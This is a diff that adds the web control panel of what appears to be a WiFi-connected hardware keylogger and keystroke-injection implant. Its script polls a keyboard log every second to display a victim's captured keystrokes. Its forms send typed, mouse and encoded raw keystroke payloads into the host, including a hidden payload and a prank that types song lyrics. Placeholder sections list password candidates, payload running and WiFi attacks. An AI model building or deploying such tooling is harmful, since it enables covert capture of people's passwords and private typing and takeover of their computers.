@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+
+body {
+	font-family: 'Lucida Console', Monaco, monospace;
+	background-color: #111111;
+	color: #ff9500;
+}
+.content {
+  max-width: 600px;
+  margin: auto;
+  padding: 10px;
+}
+
+/* Style the tab */
+.tab {
+  overflow: hidden;
+  border: 1px solid #333333;
+  background-color: #333333;
+}
+/* Style the buttons inside the tab */
+.tab button {
+  height: 48px;
+  background-color: inherit;
+  color: inherit;
+  float: left;
+  border: none;
+  outline: none;
+  cursor: pointer;
+  padding: 14px 16px;
+  transition: 0.3s;
+  font-size: 16px;
+}
+/* Change background color of buttons on hover */
+.tab button:hover {
+  background-color: #444444;
+}
+/* Create an active/current tablink class */
+.tab button.active {
+  background-color: #444444;
+}
+/* Style the tab content */
+.tabcontent {
+  display: none;
+  padding: 6px 6px;
+  border: 1px solid #333333;
+  border-top: none;
+}
+
+img {
+  float: left;
+  background-color: #333333;
+}
+
+.divR {
+  overflow-wrap: break-word;
+  width: 100%;
+  height: 250px;
+  margin: 4px;
+  padding: 4px -16px 4px 4px;;
+  border: 1px solid #333333;
+}
+.flex {
+    display: flex;
+    margin: 5px;
+}
+
+
+</style>
+</head>
+<body>
+
+<div class="content">
+<img src="logo.png" width=50 height=50/>
+
+<div class="tab">
+ 
+  <button id="but1" class="tablinks" onclick="opentab(event, 'Realtime')">REALTIME</button>
+  <button class="tablinks" onclick="opentab(event, 'Keylogger')">KEYLOGGER</button>
+  <button class="tablinks" onclick="opentab(event, 'Injection')">INJECTION</button>
+  <button class="tablinks" onclick="opentab(event, 'Wifi')">WIFI</button>
+  
+</div>
+
+<div id="Realtime" class="tabcontent">
+  Keystrokes:<br>
+  <div class="divR" id="keyboard-log">
+  
+  </div>
+ 
+  <div class="flex"> 
+  <div>
+  <br>
+  Keyboard injection:<br>
+  <form action="/inject" method="post">
+    <input type="text" name="keystrokes">
+    <input type="submit" value="Inject">
+  </form>
+  <br>
+  Mouse injection:<br>
+  <form action="/mouse" method="post">
+    <input type="text" name="mouseaction">
+    <input type="submit" value="Inject">
+  </form>
+ 
+
+  <br>
+  <form action="/injectRaw" method="post">
+    <input type="hidden" name="keystrokes" value="DLAD3bU3bULAD09U09D0cU0cD15U15D08U08D09U09D12U12D1bU1bD2cU2cD0aU0aD0cU0cD17U17D0bU0bD18U18D05U05D37U37D06U06D12U12D10U10D54U54D0eU0eD15U15D0cU0cD13U13D17U17D0bU0bD12U12D15U15D28U28">
+    <input type="submit" value="Github">
+  </form>
+  <br>
+  <form action="/inject" method="post">
+    <input type="hidden" name="keystrokes" value="
+We're no strangers to love
+You know the rules and so do I
+A full commitment's what I'm thinking of
+You wouldn't get this from any other guy
+
+I just wanna tell you how I'm feeling
+Gotta make you understand
+
+Never gonna give you up
+Never gonna let you down
+Never gonna run around and desert you
+Never gonna make you cry
+Never gonna say goodbye
+Never gonna tell a lie and hurt you
+
+We've known each other for so long
+Your heart's been aching, but
+You're too shy to say it
+Inside, we both know what's been going on
+We know the game and we're gonna play it
+
+And if you ask me how I'm feeling
+Don't tell me you're too blind to see
+
+Never gonna give you up
+Never gonna let you down
+Never gonna run around and desert you
+Never gonna make you cry
+Never gonna say goodbye
+Never gonna tell a lie and hurt you
+">
+<input type="submit" value=" Troll ">
+  </form>
+  </div> 
+  <div> 
+ <br>
+  Test:<br>
+  <form action="/injectRaw" method="post">
+    <input type="hidden" name="keystrokes" value="D50U50">
+    <input type="submit" style="height:50px" value=" <   <   < " >
+  </form>
+  <br>
+  <form action="/injectRaw" method="post">
+    <input type="hidden" name="keystrokes" value="D4fU4f">
+    <input type="submit" style="height:50px" value=" >   >   > ">
+  </form>
+
+  </div>
+</div>  
+</div>
+
+<div id="Keylogger" class="tabcontent">
+  <h3>Keylogger files and functions</h3>
+  <p>TODO:</p> 
+  <p>Keylog management</p> 
+  <p>Password candidates</p> 
+</div>
+
+<div id="Injection" class="tabcontent">
+  <h3>Injection payloads and functions</h3>
+  <p>TODO:</p> 
+  <p>Payload management</p> 
+  <p>Payload editing</p> 
+  <p>Payload running</p>
+</div>
+
+<div id="Wifi" class="tabcontent">
+  <h3>WIFI functions</h3>
+  <p>TODO:</p> 
+  <p>AP management</p> 
+  <p>Wifi scan</p> 
+  <p>Wifi connect(back)</p> 
+  <p>Wifi attacks</p>
+</div>
+
+<script>
+	
+function opentab(evt, tabname) {
+  var i, tabcontent, tablinks;
+  tabcontent = document.getElementsByClassName("tabcontent");
+  for (i = 0; i < tabcontent.length; i++) {
+    tabcontent[i].style.display = "none";
+  }
+  tablinks = document.getElementsByClassName("tablinks");
+  for (i = 0; i < tablinks.length; i++) {
+    tablinks[i].className = tablinks[i].className.replace(" active", "");
+  }
+  document.getElementById(tabname).style.display = "block";
+  evt.currentTarget.className += " active";
+}
+
+document.getElementById("but1").click(); 
+
+
+window.setInterval(function() {
+   var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4) {
+            if (xhr.status == 200) {
+                document.getElementById("keyboard-log").innerText = xhr.responseText;
+               
+            }
+        }
+    };
+    xhr.open("GET", "/keyboard-log.txt");
+    xhr.send();
+  }, 1000);
+   
+
+</script>
+</div>
+</body>
+</html> 
